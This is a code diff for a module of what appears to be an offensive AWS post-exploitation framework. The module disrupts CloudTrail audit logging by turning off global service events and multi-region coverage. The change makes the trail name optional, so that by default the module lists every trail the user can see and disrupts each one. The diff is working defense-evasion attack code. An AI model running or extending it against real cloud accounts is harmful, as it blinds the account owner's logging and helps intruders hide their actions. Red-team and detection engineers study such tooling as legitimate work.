@@ -1,5 +1,6 @@
 import boto3
 
+from rebelykos.core.response import Response as res
 from rebelykos.core.teamserver.module import Module
 
 
@@ -11,18 +12,36 @@ class RLModule(Module):
                             " and IsMultiRegionTrail False")
         self.author = "Takahiro Yokoyama"
         self.options["name"] = {
-            "Description": "Name of the trail to disrupt",
-            "Required": True,
+            "Description": ("Name of the trail to disrupt, if not specified"
+                            ", try to disrupt all trails user could list"),
+            "Required": False,
             "Value": ""
         }
 
     def run(self):
+
+        def _disrupt(name):
+            result.extend(self._handle_err(client.update_trail,
+                                           msg="Successfully disrupt trail!",
+                                           Name=name,
+                                           IncludeGlobalServiceEvents=False,
+                                           IsMultiRegionTrail=False))
+
         result = []
         client = boto3.client("cloudtrail", **self["profile"])
-        result.extend(self._handle_err(client.update_trail,
-                                       msg="Successfully disrupt trail!",
-                                       Name=self["name"],
-                                       IncludeGlobalServiceEvents=False,
-                                       IsMultiRegionTrail=False))
+        trail_name = self["name"]
+        if trail_name:
+            _disrupt(trail_name)
+        else:
+            result.extend(self._handle_err(client.describe_trails,
+                                           key="trailList"))
+            if result[-1][0] == res.RESULT:
+                trails = result[-1][1]
+                for trail in trails:
+                    _disrupt(trail["Name"])
+            else:
+                result.append((res.INFO,
+                               ("Lack of right to list trails "
+                                "but might be able to disrupt trail"
+                                " if you specify trail name")))
         return result
-
